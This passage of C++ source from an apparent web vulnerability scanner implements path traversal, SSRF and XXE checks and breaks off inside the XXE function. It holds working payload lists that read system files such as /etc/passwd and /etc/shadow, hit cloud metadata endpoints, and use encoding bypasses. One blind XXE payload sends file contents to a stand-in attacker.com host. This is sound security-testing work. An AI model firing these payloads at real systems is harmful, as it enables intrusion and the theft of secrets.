    all_payloads.insert(all_payloads.end(), unix_basic_payloads.begin(), unix_basic_payloads.end());
    all_payloads.insert(all_payloads.end(), windows_basic_payloads.begin(), windows_basic_payloads.end());
    all_payloads.insert(all_payloads.end(), url_encoded_payloads.begin(), url_encoded_payloads.end());
    all_payloads.insert(all_payloads.end(), double_encoded_payloads.begin(), double_encoded_payloads.end());
    all_payloads.insert(all_payloads.end(), null_byte_payloads.begin(), null_byte_payloads.end());
    all_payloads.insert(all_payloads.end(), unicode_payloads.begin(), unicode_payloads.end());
    all_payloads.insert(all_payloads.end(), alternative_payloads.begin(), alternative_payloads.end());
    
    // Test each location with payloads
    for (const auto& [location_type, location_name] : test_locations) {
        // 1. File content detection via ResponseAnalyzer
        if (response_analyzer_) {
            for (const auto& pt_payload : all_payloads) {
                HttpRequest test_req = inject_payload(pt_payload.payload, location_name);
                HttpResponse test_resp;
                
                if (!client_.perform(test_req, test_resp)) {
                    continue;
                }
                
                // Convert headers to map
                std::map<std::string, std::string> headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    headers_map[key] = value;
                }
                
                // Analyze response for file content
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                
                if (analysis.has_file_content) {
                    // Path traversal detected via file content
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "path_traversal";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    // Identify accessed file from matches
                    std::string accessed_file = "unknown";
                    for (const auto& match : analysis.matches) {
                        if (match.type == PatternType::FILE_CONTENT) {
                            if (match.pattern_name.find("passwd") != std::string::npos) {
                                accessed_file = "/etc/passwd";
                            } else if (match.pattern_name.find("win.ini") != std::string::npos || 
                                      match.pattern_name.find("windows") != std::string::npos) {
                                accessed_file = "C:\\Windows\\win.ini";
                            } else if (match.pattern_name.find("hosts") != std::string::npos) {
                                accessed_file = (pt_payload.os_type == "windows") ? 
                                    "C:\\Windows\\System32\\drivers\\etc\\hosts" : "/etc/hosts";
                            } else if (match.pattern_name.find("web_config") != std::string::npos) {
                                accessed_file = "web.config";
                            }
                            break;
                        }
                    }
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Path traversal detected via file content";
                    evidence["detection_method"] = "file_content";
                    evidence["os_type"] = pt_payload.os_type;
                    evidence["encoding_type"] = pt_payload.encoding_type;
                    evidence["payload"] = pt_payload.payload;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["accessed_file"] = accessed_file;
                    evidence["target_file"] = pt_payload.target_file;
                    evidence["status"] = test_resp.status;
                    
                    // Add file content evidence
                    if (!analysis.matches.empty()) {
                        for (const auto& match : analysis.matches) {
                            if (match.type == PatternType::FILE_CONTENT) {
                                evidence["file_content"] = match.evidence;
                                evidence["file_content_context"] = match.context;
                                evidence["file_pattern"] = match.pattern_name;
                                break;
                            }
                        }
                    }
                    
                    f.evidence = evidence;
                    f.severity = "high";
                    f.confidence = std::min(1.0, analysis.matches.empty() ? 0.85 : 
                                          (analysis.matches[0].confidence + pt_payload.confidence_boost));
                    f.remediation_id = "path_traversal";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
        
        // 2. Baseline comparison detection
        if (baseline_comparator_ && baseline_established) {
            // Test with a few key payloads that should produce different content
            std::vector<PathTraversalPayload> baseline_test_payloads = {
                {"../../../etc/passwd", "unix", "basic", "passwd", 0.95},
                {"..\\..\\..\\windows\\win.ini", "windows", "basic", "win.ini", 0.95},
                {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "unix", "url_encoded", "passwd", 0.95}
            };
            
            for (const auto& pt_payload : baseline_test_payloads) {
                HttpRequest test_req = inject_payload(pt_payload.payload, location_name);
                HttpResponse test_resp;
                
                bool success = client_.perform(test_req, test_resp);
                if (!success) {
                    continue;
                }
                
                // Compare with baseline
                ComparisonResult comparison = baseline_comparator_->compare(
                    baseline_resp, test_resp, TimingBaseline(), 0.0, pt_payload.payload);
                
                // Check for significant differences that indicate path traversal
                bool indicates_pt = false;
                double pt_confidence = 0.0;
                
                // Check if response contains file content indicators
                if (response_analyzer_) {
                    std::map<std::string, std::string> headers_map;
                    for (const auto& [key, value] : test_resp.headers) {
                        headers_map[key] = value;
                    }
                    AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                    if (analysis.has_file_content) {
                        indicates_pt = true;
                        pt_confidence = 0.9;
                    }
                }
                
                // Check for significant content changes
                if (comparison.length_changed && std::abs(comparison.length_change_percentage) > 30.0) {
                    indicates_pt = true;
                    pt_confidence = std::max(pt_confidence, 0.7);
                }
                
                if (comparison.similarity_score < 0.4) {
                    // Very different content
                    indicates_pt = true;
                    pt_confidence = std::max(pt_confidence, 0.75);
                }
                
                // Check for file content patterns in response
                std::string lower_body = test_resp.body;
                std::transform(lower_body.begin(), lower_body.end(), lower_body.begin(), ::tolower);
                if (lower_body.find("root:") != std::string::npos || 
                    lower_body.find("[fonts]") != std::string::npos ||
                    lower_body.find("127.0.0.1") != std::string::npos) {
                    indicates_pt = true;
                    pt_confidence = std::max(pt_confidence, 0.85);
                }
                
                if (indicates_pt && pt_confidence >= confidenceThreshold_) {
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "path_traversal";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Path traversal detected via baseline comparison";
                    evidence["detection_method"] = "baseline comparison";
                    evidence["os_type"] = pt_payload.os_type;
                    evidence["encoding_type"] = pt_payload.encoding_type;
                    evidence["payload"] = pt_payload.payload;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["target_file"] = pt_payload.target_file;
                    evidence["similarity_score"] = comparison.similarity_score;
                    evidence["length_change_percentage"] = comparison.length_change_percentage;
                    evidence["confidence"] = pt_confidence;
                    
                    f.evidence = evidence;
                    f.severity = "high";
                    f.confidence = pt_confidence;
                    f.remediation_id = "path_traversal";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
    }
}

// Helper function to check if an IP address is internal/private
static bool is_internal_ip(const std::string& ip) {
    // Check for localhost
    if (ip == "127.0.0.1" || ip == "::1" || ip == "localhost") {
        return true;
    }
    
    // Check for link-local (cloud metadata)
    if (ip == "169.254.169.254") {
        return true;
    }
    
    // Check for private IP ranges
    // 10.0.0.0/8
    if (ip.find("10.") == 0) {
        return true;
    }
    
    // 192.168.0.0/16
    if (ip.find("192.168.") == 0) {
        return true;
    }
    
    // 172.16.0.0/12
    if (ip.find("172.") == 0) {
        size_t dot1 = ip.find('.', 4);
        if (dot1 != std::string::npos) {
            try {
                int second_octet = std::stoi(ip.substr(4, dot1 - 4));
                if (second_octet >= 16 && second_octet <= 31) {
                    return true;
                }
            } catch (...) {
                // Invalid IP format
            }
        }
    }
    
    return false;
}

// Helper function to check if a hostname is internal
static bool is_internal_hostname(const std::string& hostname) {
    std::string lower = hostname;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    // Common internal hostnames
    if (lower == "localhost" || 
        lower == "local" ||
        lower == "internal" ||
        lower == "metadata" ||
        lower.find(".local") != std::string::npos ||
        lower.find(".internal") != std::string::npos ||
        lower.find("127.0.0.1") != std::string::npos ||
        lower.find("169.254.169.254") != std::string::npos) {
        return true;
    }
    
    return false;
}

// Helper function to check if a URL is a cloud metadata endpoint
static std::string detect_cloud_metadata(const std::string& url) {
    std::string lower = url;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    // AWS metadata
    if (lower.find("169.254.169.254/latest/meta-data") != std::string::npos ||
        lower.find("169.254.169.254/latest/user-data") != std::string::npos) {
        return "aws";
    }
    
    // GCP metadata
    if (lower.find("169.254.169.254/computemetadata") != std::string::npos ||
        lower.find("metadata.google.internal") != std::string::npos) {
        return "gcp";
    }
    
    // Azure metadata
    if (lower.find("169.254.169.254/metadata/instance") != std::string::npos ||
        lower.find("169.254.169.254/metadata/identity") != std::string::npos) {
        return "azure";
    }
    
    return "";
}

// Helper function to check if response contains internal content indicators
static bool contains_internal_content(const std::string& response_body, const std::string& payload) {
    std::string lower_body = response_body;
    std::transform(lower_body.begin(), lower_body.end(), lower_body.begin(), ::tolower);
    
    // Check for cloud metadata indicators
    if (lower_body.find("instance-id") != std::string::npos ||
        lower_body.find("ami-id") != std::string::npos ||
        lower_body.find("availability-zone") != std::string::npos ||
        lower_body.find("computeMetadata") != std::string::npos ||
        lower_body.find("metadata/instance") != std::string::npos ||
        lower_body.find("subscriptionId") != std::string::npos ||
        lower_body.find("resourceGroupName") != std::string::npos) {
        return true;
    }
    
    // Check for localhost/127.0.0.1 in response (might indicate internal service response)
    if (lower_body.find("127.0.0.1") != std::string::npos ||
        lower_body.find("localhost") != std::string::npos) {
        return true;
    }
    
    // Check for file protocol content (file:// responses)
    if (payload.find("file://") != std::string::npos) {
        // Check for common file content patterns
        if (lower_body.find("root:") != std::string::npos ||
            lower_body.find("[fonts]") != std::string::npos ||
            lower_body.find("<?xml") != std::string::npos) {
            return true;
        }
    }
    
    return false;
}

void VulnEngine::checkSSRF(const CrawlResult& result, std::vector<Finding>& findings) {
    // SSRF payloads for different attack vectors
    struct SSRFPayload {
        std::string payload;
        std::string payload_type;  // "internal_ip", "internal_hostname", "protocol_handler", "cloud_metadata", "bypass"
        std::string cloud_provider;  // "aws", "gcp", "azure", ""
        double confidence_boost;  // Additional confidence if detected
    };
    
    // Internal IP addresses
    std::vector<SSRFPayload> internal_ip_payloads = {
        {"http://127.0.0.1:8080", "internal_ip", "", 0.95},
        {"http://127.0.0.1/", "internal_ip", "", 0.95},
        {"http://[::1]:8080", "internal_ip", "", 0.95},
        {"http://10.0.0.1:8080", "internal_ip", "", 0.90},
        {"http://192.168.1.1:8080", "internal_ip", "", 0.90},
        {"http://172.16.0.1:8080", "internal_ip", "", 0.90}
    };
    
    // Cloud metadata endpoints
    std::vector<SSRFPayload> cloud_metadata_payloads = {
        {"http://169.254.169.254/latest/meta-data/", "cloud_metadata", "aws", 0.98},
        {"http://169.254.169.254/latest/meta-data/instance-id", "cloud_metadata", "aws", 0.98},
        {"http://169.254.169.254/computeMetadata/v1/", "cloud_metadata", "gcp", 0.98},
        {"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "cloud_metadata", "azure", 0.98}
    };
    
    // Internal hostnames
    std::vector<SSRFPayload> internal_hostname_payloads = {
        {"http://localhost:8080", "internal_hostname", "", 0.95},
        {"http://localhost/", "internal_hostname", "", 0.95},
        {"http://internal:8080", "internal_hostname", "", 0.85},
        {"http://metadata:8080", "internal_hostname", "", 0.85},
        {"http://local:8080", "internal_hostname", "", 0.80}
    };
    
    // Protocol handlers
    std::vector<SSRFPayload> protocol_handler_payloads = {
        {"file:///etc/passwd", "protocol_handler", "", 0.95},
        {"file:///C:/Windows/win.ini", "protocol_handler", "", 0.95},
        {"gopher://127.0.0.1:8080", "protocol_handler", "", 0.90},
        {"dict://127.0.0.1:8080", "protocol_handler", "", 0.90},
        {"ldap://127.0.0.1:389", "protocol_handler", "", 0.85}
    };
    
    // Bypass techniques
    std::vector<SSRFPayload> bypass_payloads = {
        {"http://example.com@127.0.0.1:8080", "bypass", "", 0.85},
        {"http://example.com#127.0.0.1:8080", "bypass", "", 0.85},
        {"http://%6c%6f%63%61%6c%68%6f%73%74:8080", "bypass", "", 0.80},
        {"http://0177.0.0.1:8080", "bypass", "", 0.80},
        {"http://2130706433:8080", "bypass", "", 0.80}
    };
    
    // Combine all payloads
    std::vector<SSRFPayload> all_payloads;
    all_payloads.insert(all_payloads.end(), internal_ip_payloads.begin(), internal_ip_payloads.end());
    all_payloads.insert(all_payloads.end(), cloud_metadata_payloads.begin(), cloud_metadata_payloads.end());
    all_payloads.insert(all_payloads.end(), internal_hostname_payloads.begin(), internal_hostname_payloads.end());
    all_payloads.insert(all_payloads.end(), protocol_handler_payloads.begin(), protocol_handler_payloads.end());
    all_payloads.insert(all_payloads.end(), bypass_payloads.begin(), bypass_payloads.end());
    
    // Add out-of-band (OOB) payloads if callback URL is configured
    std::vector<SSRFPayload> oob_payloads;
    std::vector<std::string> oob_tokens;  // Track tokens for verification
    if (!callback_url_.empty()) {
        std::string token = generateCallbackToken();
        std::string callback = buildCallbackUrl(token);
        if (!callback.empty()) {
            oob_payloads.push_back({callback, "oob", "", 0.85});
            oob_tokens.push_back(token);
            // Store token with timestamp for later verification
            active_tokens_[token] = std::chrono::system_clock::now();
        }
    }
    all_payloads.insert(all_payloads.end(), oob_payloads.begin(), oob_payloads.end());
    
    // Identify URL parameters (parameters that might accept URLs)
    std::vector<std::pair<std::string, std::string>> url_params;
    
    // Common URL parameter names
    std::vector<std::string> url_param_names = {"url", "uri", "link", "src", "dest", "target", 
                                                 "redirect", "next", "return", "fetch", "proxy",
                                                 "path", "file", "page", "resource"};
    
    for (const auto& [param, value] : result.params) {
        std::string lower_param = param;
        std::transform(lower_param.begin(), lower_param.end(), lower_param.begin(), ::tolower);
        
        // Check if parameter name suggests it accepts URLs
        bool is_url_param = false;
        for (const auto& url_param_name : url_param_names) {
            if (lower_param.find(url_param_name) != std::string::npos) {
                is_url_param = true;
                break;
            }
        }
        
        // Also check if the value looks like a URL
        if (!is_url_param && (value.find("http://") != std::string::npos || 
                             value.find("https://") != std::string::npos ||
                             value.find("file://") != std::string::npos)) {
            is_url_param = true;
        }
        
        if (is_url_param) {
            url_params.push_back({param, value});
        }
    }
    
    // If no URL parameters found but POST/PUT, test body
    bool is_post_put = (result.method == "POST" || result.method == "PUT");
    if (url_params.empty() && is_post_put) {
        url_params.push_back({"url", ""});
    }
    
    if (url_params.empty()) {
        return; // No URL parameters to test
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Test each URL parameter with payloads
    for (const auto& [param_name, original_value] : url_params) {
        for (const auto& ssrf_payload : all_payloads) {
            HttpRequest test_req = base_req;
            
            // Inject payload into parameter
            if (result.method == "GET" || result.method == "HEAD") {
                test_req.url = build_url_with_param(result.url, result.params, param_name, ssrf_payload.payload);
            } else {
                // POST/PUT body
                if (!result.params.empty()) {
                    std::ostringstream body;
                    bool first = true;
                    for (const auto& [key, value] : result.params) {
                        if (!first) body << "&";
                        if (key == param_name) {
                            body << url_encode(key) << "=" << url_encode(ssrf_payload.payload);
                        } else {
                            body << url_encode(key) << "=" << url_encode(value);
                        }
                        first = false;
                    }
                    test_req.body = body.str();
                } else {
                    test_req.body = url_encode(param_name) + "=" + url_encode(ssrf_payload.payload);
                }
            }
            
            HttpResponse test_resp;
            if (!client_.perform(test_req, test_resp)) {
                continue;
            }
            
            // Check for SSRF indicators
            bool indicates_ssrf = false;
            double ssrf_confidence = 0.0;
            std::string detected_cloud = "";
            std::string accessed_resource = "";
            
            // 1. Check for cloud metadata
            detected_cloud = detect_cloud_metadata(ssrf_payload.payload);
            if (!detected_cloud.empty()) {
                indicates_ssrf = true;
                ssrf_confidence = 0.98; // Very high confidence for cloud metadata
                accessed_resource = "cloud_metadata_" + detected_cloud;
            }
            
            // 2. Check for internal content in response
            if (contains_internal_content(test_resp.body, ssrf_payload.payload)) {
                indicates_ssrf = true;
                ssrf_confidence = std::max(ssrf_confidence, 0.90);
                if (accessed_resource.empty()) {
                    accessed_resource = "internal_content";
                }
            }
            
            // 3. Check response via ResponseAnalyzer
            if (response_analyzer_) {
                std::map<std::string, std::string> headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    headers_map[key] = value;
                }
                
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                
                // Check for file content (file:// protocol)
                if (analysis.has_file_content && ssrf_payload.payload.find("file://") != std::string::npos) {
                    indicates_ssrf = true;
                    ssrf_confidence = std::max(ssrf_confidence, 0.95);
                    accessed_resource = "file_system";
                }
                
                // Check for command output (might indicate internal service)
                if (analysis.has_command_output) {
                    indicates_ssrf = true;
                    ssrf_confidence = std::max(ssrf_confidence, 0.85);
                    if (accessed_resource.empty()) {
                        accessed_resource = "internal_service";
                    }
                }
            }
            
            // 4. Check for internal IP/hostname in payload
            if (is_internal_ip(ssrf_payload.payload) || is_internal_hostname(ssrf_payload.payload)) {
                // If we got a response (not an error), it might be SSRF
                if (test_resp.status >= 200 && test_resp.status < 500) {
                    indicates_ssrf = true;
                    ssrf_confidence = std::max(ssrf_confidence, 0.85);
                    if (accessed_resource.empty()) {
                        accessed_resource = "internal_network";
                    }
                }
            }
            
            // 5. Check for protocol handlers
            if (ssrf_payload.payload_type == "protocol_handler") {
                // Protocol handlers are suspicious by themselves
                if (test_resp.status >= 200 && test_resp.status < 500 && !test_resp.body.empty()) {
                    indicates_ssrf = true;
                    ssrf_confidence = std::max(ssrf_confidence, 0.90);
                    if (accessed_resource.empty()) {
                        accessed_resource = "protocol_handler";
                    }
                }
            }
            
            // 6. Check for out-of-band (OOB) detection
            if (ssrf_payload.payload_type == "oob") {
                // For OOB, we need to wait and verify callback
                // This will be handled after all payloads are sent
                // For now, mark that we need to verify
            }
            
            if (indicates_ssrf && ssrf_confidence >= confidenceThreshold_) {
                Finding f;
                f.id = "finding_" + std::to_string(findings.size() + 1);
                f.url = result.url;
                f.method = result.method;
                f.category = "ssrf";
                f.headers = std::map<std::string, std::string>(
                    result.headers.begin(),
                    result.headers.end()
                );
                
                nlohmann::json evidence;
                evidence["description"] = "Server-Side Request Forgery (SSRF) detected";
                evidence["payload"] = ssrf_payload.payload;
                evidence["payload_type"] = ssrf_payload.payload_type;
                evidence["parameter"] = param_name;
                evidence["status"] = test_resp.status;
                
                if (!detected_cloud.empty()) {
                    evidence["cloud_provider"] = detected_cloud;
                    evidence["accessed_resource"] = accessed_resource;
                } else if (!accessed_resource.empty()) {
                    evidence["accessed_resource"] = accessed_resource;
                }
                
                // Add response analysis if available
                if (response_analyzer_) {
                    std::map<std::string, std::string> headers_map;
                    for (const auto& [key, value] : test_resp.headers) {
                        headers_map[key] = value;
                    }
                    AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                    
                    if (analysis.has_file_content || analysis.has_command_output) {
                        nlohmann::json matches_json = nlohmann::json::array();
                        for (const auto& match : analysis.matches) {
                            if (match.type == PatternType::FILE_CONTENT || 
                                match.type == PatternType::COMMAND_OUTPUT) {
                                nlohmann::json match_json;
                                match_json["pattern"] = match.pattern_name;
                                match_json["type"] = (match.type == PatternType::FILE_CONTENT) ? 
                                    "file_content" : "command_output";
                                match_json["evidence"] = match.evidence;
                                matches_json.push_back(match_json);
                            }
                        }
                        if (!matches_json.empty()) {
                            evidence["response_matches"] = matches_json;
                        }
                    }
                }
                
                evidence["response_length"] = test_resp.body.size();
                evidence["confidence"] = ssrf_confidence;
                
                f.evidence = evidence;
                f.severity = (!detected_cloud.empty()) ? "critical" : "high";
                f.confidence = ssrf_confidence;
                f.remediation_id = "ssrf";
                
                findings.push_back(std::move(f));
                
                // Only report first successful detection per parameter
                break;
            }
        }
        
        // Verify OOB callbacks after all payloads for this parameter are sent
        if (!oob_tokens.empty()) {
            // Wait a bit for callback to arrive
            std::this_thread::sleep_for(std::chrono::seconds(3));
            
            for (const auto& token : oob_tokens) {
                if (verifyCallbackReceived(token)) {
                    // OOB callback verified - create finding
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "ssrf";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Server-Side Request Forgery (SSRF) detected via out-of-band callback";
                    evidence["detection_method"] = "out-of-band";
                    evidence["callback_url"] = callback_url_;
                    evidence["token"] = token;
                    evidence["parameter"] = param_name;
                    evidence["confidence"] = 0.90;
                    
                    f.evidence = evidence;
                    f.severity = "high";
                    f.confidence = 0.90;
                    f.remediation_id = "ssrf";
                    
                    findings.push_back(std::move(f));
                    
                    // Remove token from active tracking
                    active_tokens_.erase(token);
                    break;  // Only report first OOB detection per parameter
                }
            }
        }
    }
}

// Helper function to check if content type suggests XML
static bool is_xml_content_type(const std::map<std::string, std::string>& headers) {
    auto it = headers.find("content-type");
    if (it != headers.end()) {
        std::string ct = it->second;
        std::transform(ct.begin(), ct.end(), ct.begin(), ::tolower);
        return ct.find("xml") != std::string::npos || 
               ct.find("application/xml") != std::string::npos ||
               ct.find("text/xml") != std::string::npos ||
               ct.find("application/xhtml+xml") != std::string::npos;
    }
    return false;
}

// Helper function to check if a string contains XML-like content
static bool looks_like_xml(const std::string& content) {
    if (content.empty()) return false;
    
    // Check for XML declaration or DOCTYPE
    std::string lower = content;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    
    return lower.find("<?xml") != std::string::npos ||
           lower.find("<!doctype") != std::string::npos ||
           lower.find("<root") != std::string::npos ||
           (lower.find("<") != std::string::npos && lower.find(">") != std::string::npos);
}

// Helper function to check if response contains file content from XXE
static bool contains_xxe_file_content(const std::string& response_body, const std::string& payload) {
    std::string lower_body = response_body;
    std::transform(lower_body.begin(), lower_body.end(), lower_body.begin(), ::tolower);
    
    // Check for common file content patterns
    // /etc/passwd indicators
    if (lower_body.find("root:") != std::string::npos ||
        lower_body.find("daemon:") != std::string::npos ||
        lower_body.find("/bin/") != std::string::npos) {
        return true;
    }
    
    // /etc/hostname indicators
    if (lower_body.find("localhost") != std::string::npos && 
        response_body.length() < 100) { // hostname is short
        return true;
    }
    
    // win.ini indicators
    if (lower_body.find("[fonts]") != std::string::npos ||
        lower_body.find("[extensions]") != std::string::npos) {
        return true;
    }
    
    // Check if file:// was in payload and we got file-like content
    if (payload.find("file://") != std::string::npos) {
        // If response contains content that looks like file content
        if (response_body.find("\n") != std::string::npos && 
            response_body.length() > 50) {
            return true;
        }
    }
    
    return false;
}

void VulnEngine::checkXXE(const CrawlResult& result, std::vector<Finding>& findings) {
    // XXE payloads for different attack vectors
    struct XXEPayload {
        std::string payload;
        std::string payload_type;  // "classic", "blind", "parameter_entity", "ssrf"
        std::string target_file;  // "passwd", "hostname", "win.ini", "shadow", "generic"
        double confidence_boost;  // Additional confidence if detected
    };
    
    // Classic XXE file disclosure payloads
    std::vector<XXEPayload> classic_xxe_payloads = {
        {"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", 
         "classic", "passwd", 0.95},
        {"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>", 
         "classic", "hostname", 0.90},
        {"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>", 
         "classic", "shadow", 0.95},
        {"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><foo>&xxe;</foo>", 
         "classic", "win.ini", 0.95}
    };
    
    // XXE SSRF payloads
    std::vector<XXEPayload> xxe_ssrf_payloads = {
        {"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080\">]><foo>&xxe;</foo>", 
         "ssrf", "localhost", 0.90},
        {"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1:8080\">]><foo>&xxe;</foo>", 
         "ssrf", "internal", 0.85}
    };
    
    // Blind XXE parameter entity payloads
    std::vector<XXEPayload> blind_xxe_payloads;
    
    // Generate OOB payloads if callback URL is configured, otherwise use placeholder
    if (!callback_url_.empty()) {
        std::string token = generateCallbackToken();
        std::string callback = buildCallbackUrl(token);
        if (!callback.empty()) {
            // Replace "attacker.com" with actual callback URL
            std::string oob_payload1 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"" + callback + "\">%xxe;]><foo>test</foo>";
            std::string oob_payload2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % xxe SYSTEM \"" + callback + "\">%xxe;]><foo>test</foo>";
            blind_xxe_payloads.push_back({oob_payload1, "blind", "generic", 0.85});
            blind_xxe_payloads.push_back({oob_payload2, "blind", "passwd", 0.90});
        }
    } else {
        // Fallback to placeholder URLs if no callback configured
        blind_xxe_payloads.push_back({"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe\">%xxe;]><foo>test</foo>", 
             "blind", "generic", 0.80});
        blind_xxe_payloads.push_back({"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % xxe SYSTEM \"http://attacker.com/?%file;\">%xxe;]><foo>test</foo>", 
             "blind", "passwd", 0.85});
    }
    
    // Track OOB tokens for verification
    std::vector<std::string> oob_tokens;
    if (!callback_url_.empty()) {
        std::string token = generateCallbackToken();
        oob_tokens.push_back(token);
        active_tokens_[token] = std::chrono::system_clock::now();
    }
    
    // Combine all payloads
    std::vector<XXEPayload> all_payloads;
    all_payloads.insert(all_payloads.end(), classic_xxe_payloads.begin(), classic_xxe_payloads.end());
    all_payloads.insert(all_payloads.end(), xxe_ssrf_payloads.begin(), xxe_ssrf_payloads.end());
    all_payloads.insert(all_payloads.end(), blind_xxe_payloads.begin(), blind_xxe_payloads.end());
    
    // Check if endpoint accepts XML input
    // 1. Check Content-Type header
    bool accepts_xml = false;
    std::map<std::string, std::string> headers_map;
    for (const auto& [key, value] : result.headers) {
        headers_map[key] = value;
    }
    
    if (is_xml_content_type(headers_map)) {
        accepts_xml = true;
    }
    
    // 2. Check if method is POST/PUT (common for XML endpoints)
    bool is_post_put = (result.method == "POST" || result.method == "PUT");
    
    // 3. Check parameter names that might accept XML
    std::vector<std::pair<std::string, std::string>> xml_params;
    std::vector<std::string> xml_param_names = {"xml", "data", "content", "body", "payload", 
                                                 "request", "input", "document", "file"};
    
    for (const auto& [param, value] : result.params) {
        std::string lower_param = param;
        std::transform(lower_param.begin(), lower_param.end(), lower_param.begin(), ::tolower);
        
        bool is_xml_param = false;
        for (const auto& xml_param_name : xml_param_names) {
            if (lower_param.find(xml_param_name) != std::string::npos) {
                is_xml_param = true;
                break;
            }
        }
        
        // Also check if value looks like XML
        if (!is_xml_param && looks_like_xml(value)) {
            is_xml_param = true;
        }
        
        if (is_xml_param) {
            xml_params.push_back({param, value});
        }
    }
    
    // If no XML parameters but POST/PUT, test body
    if (xml_params.empty() && is_post_put) {
        xml_params.push_back({"body", ""});
    }
    
    // Skip if endpoint doesn't appear to accept XML
    if (!accepts_xml && !is_post_put && xml_params.empty()) {
        return;
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    base_req.headers["Content-Type"] = "application/xml";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Test each XML parameter with payloads
    for (const auto& [param_name, original_value] : xml_params) {
        // Track OOB tokens for this parameter
        std::vector<std::string> param_oob_tokens;
        if (!oob_tokens.empty()) {
            param_oob_tokens = oob_tokens;  // Use the tokens generated for this parameter
        }
        
        for (const auto& xxe_payload : all_payloads) {
            HttpRequest test_req = base_req;
            
            // Inject payload
            if (result.method == "GET" || result.method == "HEAD") {
                // For GET, inject as parameter value
                test_req.url = build_url_with_param(result.url, result.params, param_name, xxe_payload.payload);
            } else {
                // POST/PUT: inject as body
                if (!result.params.empty() && param_name != "body") {
                    // Use existing parameter structure
                    std::ostringstream body;
                    bool first = true;
                    for (const auto& [key, value] : result.params) {
                        if (!first) body << "&";
                        if (key == param_name) {
                            body << url_encode(key) << "=" << url_encode(xxe_payload.payload);
                        } else {
                            body << url_encode(key) << "=" << url_encode(value);
                        }
                        first = false;
                    }
                    test_req.body = body.str();
                } else {
                    // Send XML directly as body
                    test_req.body = xxe_payload.payload;
                }
            }
            
            HttpResponse test_resp;
            if (!client_.perform(test_req, test_resp)) {
                continue;
            }
            
            // Check for XXE indicators
            bool indicates_xxe = false;
            double xxe_confidence = 0.0;
            std::string detection_method = "";
            std::string accessed_file = "";
            
            // 1. Check for file content in response (classic XXE)
            if (contains_xxe_file_content(test_resp.body, xxe_payload.payload)) {
                indicates_xxe = true;
                xxe_confidence = 0.95;
                detection_method = "file_content";
                accessed_file = xxe_payload.target_file;
            }
            
            // 2. Check response via ResponseAnalyzer
            if (response_analyzer_) {
                std::map<std::string, std::string> resp_headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    resp_headers_map[key] = value;
                }
                
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, resp_headers_map);
                
                // Check for file content
                if (analysis.has_file_content) {
                    indicates_xxe = true;
                    xxe_confidence = std::max(xxe_confidence, 0.95);
                    detection_method = "file_content";
                    
                    // Identify accessed file from matches
                    for (const auto& match : analysis.matches) {
                        if (match.type == PatternType::FILE_CONTENT) {
